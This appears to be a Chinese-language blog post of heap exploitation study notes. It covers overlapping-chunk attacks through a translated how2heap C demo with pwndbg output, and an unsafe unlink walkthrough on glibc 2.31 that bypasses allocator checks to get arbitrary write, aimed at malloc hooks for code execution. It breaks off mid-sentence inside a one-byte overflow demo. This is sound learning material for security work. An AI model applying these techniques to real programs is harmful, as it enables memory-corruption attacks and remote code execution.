<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">last_remainder: 0x0 (size : 0x0) </span><br><span class="line">     unsortbin: 0x9f2100 (size : 0x100)</span><br></pre></td></tr></table></figure>
<p>接下來假設有溢出問題，可以蓋掉chunk2 size</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x9f2000 </span><br><span class="line">0x9f2000:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x9f2010:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2020:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2030:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2040:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2050:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2060:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2070:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2080:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2090:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20a0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20b0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20c0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20d0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20e0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20f0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2100:	0x3131313131313131	0x0000000000000181</span><br><span class="line">0x9f2110:	0x000070cfb3cd1b78	0x000070cfb3cd1b78</span><br><span class="line">0x9f2120:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2130:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2140:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2150:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2160:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2170:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2180:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2190:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21a0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21b0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21c0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21d0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21e0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21f0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2200:	0x0000000000000100	0x0000000000000080</span><br><span class="line">0x9f2210:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2220:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2230:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2240:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2250:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2260:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2270:	0x3333333333333333	0x3333333333333333</span><br></pre></td></tr></table></figure>
<p>0x101變成0x181</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">last_remainder: 0x0 (size : 0x0) </span><br><span class="line">     unsortbin: 0x9f2100 (size : 0x180)</span><br></pre></td></tr></table></figure>
<p>這時候我們去malloc一個0x178大小的chunk<br>此時chunk 4和chunk 3大小重疊</p>
<p>可以覆蓋到其他chunk上</p>
<h3 id="how2heap-glibc-2-23-2"><a href="#how2heap-glibc-2-23-2" class="headerlink" title="how2heap(glibc 2.23 -2)"></a>how2heap(glibc 2.23 -2)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 又一個簡單的重疊chunk問題。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 這個技術取自於</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 這也被稱為非鄰近釋放chunk合併攻擊。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="type">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n這是一個簡單的chunk重疊問題&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n這也被稱為非鄰近釋放chunk合併攻擊\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n讓我們開始在堆上分配5個chunk:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n\nchunk p1 從 %p 到 %p&quot;</span>, p1, (<span class="type">unsigned</span> <span class="type">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p2 從 %p 到 %p&quot;</span>, p2,  (<span class="type">unsigned</span> <span class="type">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 從 %p 到 %p&quot;</span>, p3,  (<span class="type">unsigned</span> <span class="type">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p4 從 %p 到 %p&quot;</span>, p4, (<span class="type">unsigned</span> <span class="type">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p5 從 %p 到 %p\n&quot;</span>, p5,  (<span class="type">unsigned</span> <span class="type">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n讓我們釋放chunk p4。\n在這種情況下，這不會與top chunk合併，因為我們有p5緊挨著top chunk在p4之後\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n讓我們在chunk p1上觸發漏洞，覆寫使用中的chunk p2的大小\n使用chunk_p2的大小+chunk_p3的大小\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">unsigned</span> <span class="type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n現在在對p2進行free()操作期間，分配器會被愚弄，以為\n下一個chunk是p4（因為p2 + size_p2現在指向p4）\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n這個操作將基本上創建一個錯誤地包含p3的大free chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n現在讓我們分配一個新chunk，其大小可以由先前釋放的chunk滿足\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n我們的malloc()已經由我們製造的大free chunk滿足，現在p6和p3重疊，\n我們可以通過在chunk p6中寫入來覆寫p3中的數據\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p6 從 %p 到 %p&quot;</span>, p6,  (<span class="type">unsigned</span> <span class="type">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 從 %p 到 %p\n&quot;</span>, p3, (<span class="type">unsigned</span> <span class="type">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3中的數據: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n讓我們在p6中寫入一些內容\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3中的數據: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先先malloc了五個chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line">0xbdb000            0x0                 0x3f0                Used                None              None</span><br><span class="line">0xbdb3f0            0x0                 0x3f0                Used                None              None</span><br><span class="line">0xbdb7e0            0x0                 0x3f0                Used                None              None</span><br><span class="line">0xbdbbd0            0x0                 0x3f0                Used                None              None</span><br><span class="line">0xbdbfc0            0x0                 0x3f0                Used                None              None</span><br></pre></td></tr></table></figure>

<p>然後memset</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line">0x2159000           0x0                 0x3f0                Used                None              None</span><br><span class="line">0x21593f0           0x4141414141414141  0x3f0                Used                None              None</span><br><span class="line">0x21597e0           0x4242424242424242  0x3f0                Used                None              None</span><br><span class="line">0x2159bd0           0x4343434343434343  0x3f0                Used                None              None</span><br><span class="line">0x2159fc0           0x4444444444444444  0x3f0                Used                None              None</span><br></pre></td></tr></table></figure>

<p>free掉chunk 4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsortbin: 0x2159bd0 (size : 0x3f0)</span><br></pre></td></tr></table></figure>

<p>接下來改寫chunk2的大小，讓他以為下個chunk是 4 (修改為chunk 2 + chunk 3大小 0x3f0+0x3f0&#x3D;0x7e0)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line">0x2159000           0x0                 0x3f0                Used                None              None</span><br><span class="line">0x21593f0           0x4141414141414141  0x7e0                Used                None              None</span><br><span class="line">0x2159bd0           0x4343434343434343  0x3f0                Freed     0x771ada8d5b78    0x771ada8d5b78</span><br><span class="line">0x2159fc0           0x3f0               0x3f0                Used                None              None</span><br></pre></td></tr></table></figure>

<p>free掉chunk 2後會把chunk 3一起包進去<br>malloc 2000就可以任意寫chunk3了</p>
<h2 id="Unsafe-unlink-Glibc-2-31"><a href="#Unsafe-unlink-Glibc-2-31" class="headerlink" title="Unsafe unlink(Glibc 2.31)"></a>Unsafe unlink(Glibc 2.31)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>先假設我們現在有兩個ptr，ptr1、ptr2(存在一個陣列)指向兩塊malloc的記憶體</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|        | #ptr-0x18</span><br><span class="line">|        | #ptr-0x10</span><br><span class="line">|        | #ptr-0x8</span><br><span class="line">|  ptr1  |</span><br><span class="line">|  ptr2  |</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-------------------------- </span><br><span class="line">|prev size/data|   size  |</span><br><span class="line">|    fd        |    bk   | &lt;-ptr1</span><br><span class="line">|              |         |</span><br><span class="line">|              |         |</span><br><span class="line">-------------------------- </span><br><span class="line">|prev size/data|   size  |</span><br><span class="line">|    fd        |    bk   | &lt;-ptr2</span><br><span class="line">|              |         |</span><br><span class="line">|              |         |</span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>
<p>內容具體長這樣，兩塊0x430大小的chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-------------------------- </span><br><span class="line">|      0       |   0x431 |</span><br><span class="line">|      0       |    0    | &lt;-ptr1</span><br><span class="line">|              |         |</span><br><span class="line">|              |         |</span><br><span class="line">-------------------------- </span><br><span class="line">|      0       |   0x431 |</span><br><span class="line">|      0       |    0    | &lt;-ptr2</span><br><span class="line">|              |         |</span><br><span class="line">|              |         |</span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>

<p>這邊有個越界寫1 byte的漏洞，我這樣寫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--------------------------- &lt;-ptr1</span><br><span class="line">|      0       |   0x431  |</span><br><span class="line">|      0       |   0x421  |</span><br><span class="line">| &amp;ptr1-0x18   |&amp;ptr1-0x10|</span><br><span class="line">|    payload   | payload  |</span><br><span class="line">--------------------------- &lt;-ptr2</span><br><span class="line">|    0x420     |   0x430  | #這邊多寫一個byte把0x431寫成0x430</span><br><span class="line">|      0       |    0     |</span><br><span class="line">|              |          |</span><br><span class="line">|              |          |</span><br><span class="line">---------------------------</span><br></pre></td></tr></table></figure>

<p>首先看到0x430，P bit是0他會以為上一塊是free chunk，想跟上一塊做合併<br>看下方source code可以看到他抓offset抓prev size抓到了0x420所以往前抓到了0x421那行我們做的那邊free chunk，開始consolidate</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4326">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4326</a></p>
<p>進六步檢查<br>先檢查pre size，因為我們改寫所以相等 -&gt; OK</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>再來，這邊簡單來說就是讓我們做的fake chunk fd指向fd內容，bk指向bk內容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr fd = p-&gt;fd;</span><br><span class="line">mchunkptr bk = p-&gt;bk;</span><br></pre></td></tr></table></figure>
<p>所以變成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--------------------------- </span><br><span class="line">|      0       |   0x431  |</span><br><span class="line">|      0       |   0x421  | &lt;-ptr1</span><br><span class="line">| &amp;ptr1-0x18   |&amp;ptr1-0x10| #分別為fd、bk</span><br><span class="line">|    payload   | payload  |</span><br><span class="line">--------------------------- </span><br><span class="line">|    0x420     |   0x430  | #這邊多寫一個byte把0x431寫成0x430</span><br><span class="line">|      0       |    0     | &lt;-ptr2</span><br><span class="line">|              |          |</span><br><span class="line">|              |          |</span><br><span class="line">---------------------------</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake chunk fd -&gt;  |        | #ptr-0x18</span><br><span class="line">fake chunk bk -&gt;  |        | #ptr-0x10</span><br><span class="line">                  |        | #ptr-0x8</span><br><span class="line">                  |  ptr1  |</span><br><span class="line">                  |  ptr2  |</span><br></pre></td></tr></table></figure>

<p>再來進檢查，fake chunk fd指向chunk的bk(就是ptr1)指向是否跟p(就是剛剛算的offset)指向位置相同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>這邊把陣列當作chunk的話</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|prev/data| #ptr-0x18</span><br><span class="line">|  size   | #ptr-0x10</span><br><span class="line">|   (fd)  | #ptr-0x8</span><br><span class="line">| ptr1(bk)| </span><br><span class="line">|  ptr2   |</span><br></pre></td></tr></table></figure>

<p>很顯然的p跟ptr1指向fake chunk跟p指向的位置相同 -&gt; OK</p>
<p>再來是，fake chunk bk指向chunk的fd(就是ptr1)指向是否跟p(就是剛剛算的offset)指向位置相同</p>
<p>這邊把陣列當作chunk的話</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|         | #ptr-0x18</span><br><span class="line">|prev/data| #ptr-0x10</span><br><span class="line">|   size  | #ptr-0x8</span><br><span class="line">| ptr1(fd)| </span><br><span class="line">| ptr2(bk)|</span><br></pre></td></tr></table></figure>
<p>如同上面，很顯然的p跟ptr1指向fake chunk跟p指向的位置相同 -&gt; OK<br>這邊成功bypass保護機制</p>
<p>最後unlink</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure>

<p>就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|prev/data| #ptr-0x18 &lt;- fake chunk fd</span><br><span class="line">|  size   | #ptr-0x10 &lt;- fake chunk bk</span><br><span class="line">|   (fd)  | #ptr-0x8</span><br><span class="line">| ptr1(bk)| </span><br><span class="line">|  ptr2   |</span><br></pre></td></tr></table></figure>
<p>fake chunk fd指向的bk(ptr1)會指向fake chunk bk指向的位置(ptr1-0x10)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|         | #ptr-0x18 &lt;- fake chunk fd</span><br><span class="line">|prev/data| #ptr-0x10 &lt;- fake chunk bk</span><br><span class="line">|   size  | #ptr-0x8</span><br><span class="line">| ptr1(fd)| </span><br><span class="line">| ptr2(bk)|</span><br></pre></td></tr></table></figure>
<p>fake chunk bk指向的fd(ptr1)會指向fake chunk fd指向的位置(ptr1-0x18)</p>
<p>Unlink結束，最後發現ptr1現在指向的位置是ptr1-0x18<br>通常我們的ptr1是可以任意寫他指向的位置的<br>所以可以寫ptr1-0x18，一路往下寫，把ptr1改寫成任意位置，來達到任意寫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| aaa... | #ptr-0x18</span><br><span class="line">| aaa... | #ptr-0x10</span><br><span class="line">| aaa... | #ptr-0x8</span><br><span class="line">|pwn addr|</span><br><span class="line">|  ptr2  |</span><br></pre></td></tr></table></figure>

<p>ptr1-&gt;pwn addr<br>可以任意寫入pwn addr(可能是malloc hook之類的來RCE)</p>
<h3 id="一些越界1-byte的例子"><a href="#一些越界1-byte的例子" class="headerlink" title="一些越界1 byte的例子"></a>一些越界1 byte的例子</h3><h4 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_gets</span><span class="params">(<span class="type">char</span> *ptr,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        